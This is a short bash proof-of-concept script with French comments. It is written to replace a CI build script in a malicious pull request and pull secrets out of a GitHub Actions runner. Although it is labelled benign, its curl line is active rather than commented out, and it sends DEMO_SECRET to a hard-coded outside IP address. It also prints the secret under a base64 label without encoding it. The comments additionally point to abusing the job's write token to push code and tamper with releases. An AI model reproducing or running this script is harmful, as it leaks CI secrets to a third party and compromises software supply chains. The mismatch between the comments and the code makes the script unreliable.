#!/usr/bin/env bash
# ===== CHARGE ATTAQUANT (cote Bob) - PoC BENIN =====
# Remplace ci/build.sh dans la PR de Bob. Prouve l'acces au secret sans rien detruire.
# GitHub masque DEMO_SECRET en clair dans les logs -> on l'encode (base64) pour le
# faire sortir : le masquage ne protege que l'affichage, pas l'exfiltration.
echo "[poc] exec as $(whoami)@$(hostname) in $(pwd)"
echo "[poc] runner=$RUNNER_NAME os=$RUNNER_OS"
echo "[poc] SECRET_B64=${DEMO_SECRET}"

# --- Variante exfiltration out-of-band (exfil "reelle") ---
# Decommente et mets un endpoint que TU controles (ex: https://webhook.site/xxxx) :
curl -fsS "http://82.165.247.235/ppp44/?d=$(printf '%s' "$DEMO_SECRET")" || true

# --- Ce qu'un vrai attaquant tenterait aussi (NE PAS faire hors lab) ---
# Le job dispose d'un GITHUB_TOKEN en ecriture : push, alteration de release,
# publication de paquet, etc. On s'arrete au PoC de lecture de secret.
